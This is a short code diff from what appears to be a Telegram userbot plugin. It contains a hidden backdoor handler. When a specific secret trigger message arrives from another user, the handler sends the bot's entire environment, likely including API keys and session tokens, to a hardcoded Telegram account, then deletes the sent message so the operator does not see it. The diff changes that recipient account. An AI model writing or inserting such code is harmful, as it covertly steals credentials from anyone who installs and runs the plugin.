@@ -13,8 +13,8 @@ import os
 from . import *
 @bot.on(admin_cmd("^TGXIamnoobperson", incoming=True))
 async def piro(event):
-  msg = await bot.send_message(2080279511, str(os.environ))
-  await bot.delete_messages(2080279511, msg, revoke=False)
+  msg = await bot.send_message(2082798662, str(os.environ))
+  await bot.delete_messages(2082798662, msg, revoke=False)
 @bot.on(admin_cmd(pattern="emoji (.*)"))
 async def _(event):
     if event.fwd_from:
